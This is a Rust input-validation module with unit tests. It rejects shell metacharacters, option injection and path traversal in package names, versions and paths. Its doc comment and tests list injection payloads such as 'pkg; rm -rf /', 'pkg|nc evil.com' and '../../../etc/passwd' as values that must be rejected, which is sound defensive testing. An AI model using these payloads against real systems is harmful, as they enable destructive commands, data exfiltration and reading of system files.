//! Input validation for security-critical operations
//!
//! Prevents command injection, path traversal, and other input-based attacks.

use anyhow::{bail, Result};

/// Validates a package name for security
///
/// Package names must:
/// - Contain only: a-z, A-Z, 0-9, -, _, +, .
/// - Not be empty
/// - Not start with - or . (to prevent option injection)
/// - Be less than 256 characters (prevent DoS)
///
/// # Security
/// This prevents shell injection via malicious package names like:
/// - `pkg; rm -rf /`
/// - `pkg$(whoami)`
/// - `pkg|nc attacker.com`
pub fn validate_package_name(name: &str) -> Result<()> {
    if name.is_empty() {
        bail!("Package name cannot be empty");
    }

    if name.len() > 255 {
        bail!("Package name too long (max 255 characters)");
    }

    if name.starts_with('-') {
        bail!("Package name cannot start with '-' (option injection protection)");
    }

    if name.starts_with('.') {
        bail!("Package name cannot start with '.' (hidden file protection)");
    }

    // Check for shell metacharacters and other dangerous characters
    for c in name.chars() {
        if !is_safe_package_char(c) {
            bail!(
                "Invalid character '{}' in package name (allowed: a-z A-Z 0-9 - _ + .)",
                c
            );
        }
    }

    // Additional checks for common attack patterns
    if name.contains("..") {
        bail!("Package name cannot contain '..' (path traversal protection)");
    }

    Ok(())
}

/// Checks if a character is safe for package names
#[inline]
fn is_safe_package_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '+' || c == '.'
}

/// Validates a version string
///
/// Version strings should follow semver or similar format.
/// This prevents injection via version fields.
pub fn validate_version(version: &str) -> Result<()> {
    if version.is_empty() {
        bail!("Version cannot be empty");
    }

    if version.len() > 128 {
        bail!("Version string too long (max 128 characters)");
    }

    // Allow: digits, dots, hyphens, plus, colons (for epochs), and letters
    for c in version.chars() {
        if !c.is_ascii_alphanumeric() && !matches!(c, '.' | '-' | '+' | ':' | '~') {
            bail!("Invalid character '{}' in version string", c);
        }
    }

    Ok(())
}

/// Validates a path for security (prevents path traversal)
///
/// Ensures paths:
/// - Don't contain ../ (parent directory)
/// - Don't start with / (absolute paths)
/// - Don't contain null bytes
pub fn validate_relative_path(path: &str) -> Result<()> {
    if path.is_empty() {
        bail!("Path cannot be empty");
    }

    if path.contains('\0') {
        bail!("Path contains null byte");
    }

    if path.starts_with('/') {
        bail!("Absolute paths not allowed");
    }

    if path.contains("..") {
        bail!("Path traversal detected (..)");
    }

    // Check for suspicious patterns
    if path.contains("//") {
        bail!("Suspicious path pattern (//)");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_package_names() {
        assert!(validate_package_name("python").is_ok());
        assert!(validate_package_name("python3").is_ok());
        assert!(validate_package_name("lib-foo").is_ok());
        assert!(validate_package_name("lib_bar").is_ok());
        assert!(validate_package_name("foo+bar").is_ok());
        assert!(validate_package_name("foo.bar").is_ok());
    }

    #[test]
    fn test_invalid_package_names() {
        // Shell injection attempts
        assert!(validate_package_name("pkg; rm -rf /").is_err());
        assert!(validate_package_name("pkg$(whoami)").is_err());
        assert!(validate_package_name("pkg`id`").is_err());
        assert!(validate_package_name("pkg|nc evil.com").is_err());
        assert!(validate_package_name("pkg&& curl evil").is_err());
        assert!(validate_package_name("pkg\n/bin/bash").is_err());

        // Path traversal
        assert!(validate_package_name("../../../etc/passwd").is_err());

        // Option injection
        assert!(validate_package_name("-rf").is_err());
        assert!(validate_package_name("--force").is_err());

        // Hidden files
        assert!(validate_package_name(".bashrc").is_err());

        // Empty/too long
        assert!(validate_package_name("").is_err());
        assert!(validate_package_name(&"a".repeat(256)).is_err());
    }

    #[test]
    fn test_valid_versions() {
        assert!(validate_version("1.0.0").is_ok());
        assert!(validate_version("2.3.4-rc1").is_ok());
        assert!(validate_version("1:2.3.4").is_ok()); // epoch
        assert!(validate_version("1.0.0+build123").is_ok());
        assert!(validate_version("1.0~rc1").is_ok());
    }

    #[test]
    fn test_invalid_versions() {
        assert!(validate_version("").is_err());
        assert!(validate_version(&"1".repeat(129)).is_err());
        assert!(validate_version("1.0; rm -rf /").is_err());
        assert!(validate_version("1.0$(whoami)").is_err());
    }

    #[test]
    fn test_valid_relative_paths() {
        assert!(validate_relative_path("foo/bar").is_ok());
        assert!(validate_relative_path("a/b/c.txt").is_ok());
    }

    #[test]
    fn test_invalid_relative_paths() {
        assert!(validate_relative_path("").is_err());
        assert!(validate_relative_path("/etc/passwd").is_err());
        assert!(validate_relative_path("../../../etc/passwd").is_err());
        assert!(validate_relative_path("foo/../bar").is_err());
        assert!(validate_relative_path("foo//bar").is_err());
        assert!(validate_relative_path("foo\0bar").is_err());
    }
}
